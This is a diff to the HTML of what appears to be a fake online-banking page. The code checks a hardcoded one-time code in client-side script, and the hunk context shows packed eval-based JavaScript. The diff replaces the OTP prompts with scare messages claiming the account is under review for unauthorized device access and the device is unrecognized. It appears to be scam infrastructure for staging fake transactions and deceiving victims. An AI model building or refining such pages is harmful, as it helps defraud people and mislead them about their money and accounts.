@@ -1,3 +1,5 @@
+OTP SHUT
+
 <!doctype html>
 <html lang="en" style="height: 100%;"><head>
   <!-- Chatra {literal} -->
@@ -1576,11 +1578,11 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
 <div class="popup-overlay" id="otpPopup">
   <div class="popup">
-    <h3>Enter the 6-digit OTP code</h3>
-    <p><strong></strong>Transaction Receipt not accessible on the web page, please login with your mobile app to print transaction receipt or download the copy sent to your email or phone after successful transaction.</p>
-    <input type="text" id="otpInput" placeholder="Enter OTP">
+    <h3>ACCOUNT UNDER REVIEW!</h3>
+    <p><strong></strong>Transaction disabled due to an unauthorized device access! Please visit our nearest branch or verify your FaceID/Fingerprint with your registered device.</p>
+    <input type="text" id="otpInput" placeholder="OTP Disabled">
     <p class="popup-error" id="errorMessage"></p>
-    <button onclick="validateOTP()">Submit</button>
+    <button onclick="validateOTP()">Verify</button>
     <button onclick="redirectToDashboard()">Cancel</button>
   </div>
 </div>
@@ -1588,9 +1590,9 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 
 <div class="popup-overlay" id="errorPopup">
   <div class="popup">
-    <h3>INVALID OTP!</h3>
-    <p>Your account will be locked after 3 wrong attempts</p>
-    <button onclick="retryOTP()">Try Again</button>
+    <h3>DEVICE UNRECOGNIZED!</h3>
+    <p>Please log-in with your registered device.</p>
+    <button onclick="retryOTP()">Verify Again</button>
     <button onclick="redirectToDashboard()">Go to Dashboard</button>
   </div>
 </div>
@@ -1754,7 +1756,7 @@ s0.parentNode.insertBefore(s1,s0);
                 }
             }, 500); // 0.5-second intervals
         }
-  const OTP_CODE = "287776"; // Correct OTP code
+  const OTP_CODE = "221776"; // Correct OTP code
   const otpPopup = document.getElementById('otpPopup');
   const progressContainer = document.getElementById('progressContainer');
   const splashcontainer = document.getElementById('splashMessages');
